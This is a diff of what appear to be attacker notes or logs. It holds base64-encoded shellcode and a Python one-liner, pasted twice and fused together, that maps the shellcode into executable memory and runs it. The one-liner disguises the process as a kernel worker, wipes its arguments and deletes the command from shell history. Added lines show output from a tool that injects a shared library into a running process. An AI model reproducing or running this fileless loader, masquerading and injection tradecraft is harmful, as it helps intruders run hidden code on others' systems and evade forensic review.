@@ -20,3 +20,9 @@ SDHJSIHp+f///0iNBe////9Iu0MTh+gQijFTSDFYJ0gt+P///+L0C6uoinnkHiArEx64RNVjNSs+
 5LxO2NlcQxOHx2X5Q3wheunHeOVJOyIT0b9E1FtoGxyC6BCKMVM=
 
 python3 -c 'import base64,mmap,ctypes,sys,os;encoded_rawcode="SDHJSIHp+f///0iNBe////9Iu/o1F54mvAzxSDFYJ0gt+P///+L0so04/E/SI4KSNY7OcuNel5IYdMp47uT++jUXsVPPft6YXHmxTtN0mZs1Qcly4mbKojoSnia8DPE=";rawcode=base64.b64decode(encoded_rawcode);mem=mmap.mmap(-1,len(rawcode),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);mem.write(rawcode);addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));shell_func=ctypes.CFUNCTYPE(None)(addr);[sys.argv.__setitem__(i,"\\0"*len(sys.argv[i])) for i in range(len(sys.argv))];libc=ctypes.CDLL(None);libc.prctl(15,b"kworker/u9:1",0,0,0);print("When the enemy attacks you, this means that you are on the right road.");shell_func()python3 -c 'import base64,mmap,ctypes,sys,os;encoded_rawcode="SDHJSIHp+f///0iNBe////9Iu/o1F54mvAzxSDFYJ0gt+P///+L0so04/E/SI4KSNY7OcuNel5IYdMp47uT++jUXsVPPft6YXHmxTtN0mZs1Qcly4mbKojoSnia8DPE=";rawcode=base64.b64decode(encoded_rawcode);mem=mmap.mmap(-1,len(rawcode),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);mem.write(rawcode);addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));shell_func=ctypes.CFUNCTYPE(None)(addr);[sys.argv.__setitem__(i,"\\0"*len(sys.argv[i])) for i in range(len(sys.argv))];libc=ctypes.CDLL(None);libc.prctl(15,b"kworker/u9:1",0,0,0);print("When the enemy attacks you, this means that you are on the right road.");shell_func()'  && history -d $(history | awk 'END { print $1 }') &'
+
+# injector ./libinline.so 632 
+[*] Dlopen memory address: 0x7fe55f07a2a0
+[*] Found library path: ./libinline.so
+[*] Library injected successfully!
+[*] Resumed the target process: 632
